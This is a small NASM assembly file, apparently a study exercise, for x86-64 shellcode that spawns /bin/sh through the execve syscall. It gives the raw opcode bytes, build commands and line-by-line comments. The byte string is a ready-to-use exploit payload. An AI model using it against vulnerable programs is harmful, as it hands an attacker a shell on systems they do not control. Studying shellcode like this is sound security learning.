
;; execve(const char *exec, char *const v[], char *const e[])

; 48 31 d2 48 bb 2f 2f 62 69 6e 2f 73 68 48 c1 eb 08 53 48 89 e7 50 57 48 89 e6 b0 3b 0f 05
; nasm -f elf64 bash_asm.nasm -o bash_asm.o
;; ld -V (emulators)
; ld -m elf_x86_64 bash_asm.o -o bash_asm
; ld -m elf_i386 bash_asm.o -o bash_asm

 section .text
            global main

    main:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'   ; 8byte = 64bit
                                ; 68h('h'),73h('s')

            shr     rbx, 0x8                ; shift 8bit to the right hs/nib// => 0hs/nib/ : 0'/bin/sh'
            push    rbx                     ; push 0'/bin/sh'

            mov     rdi, rsp                ; rdi(arg[1]) : &(0'/bin/sh') <- *rsp

            push    rax               ; NULL?
            push    rdi               ; 0'/bin/sh'
            mov     rsi, rsp          ;; rsi(arg[2]) : 

            mov     al, 0x3b          ; arg[0] = execve
                        ; 59 64bit execve
            syscall
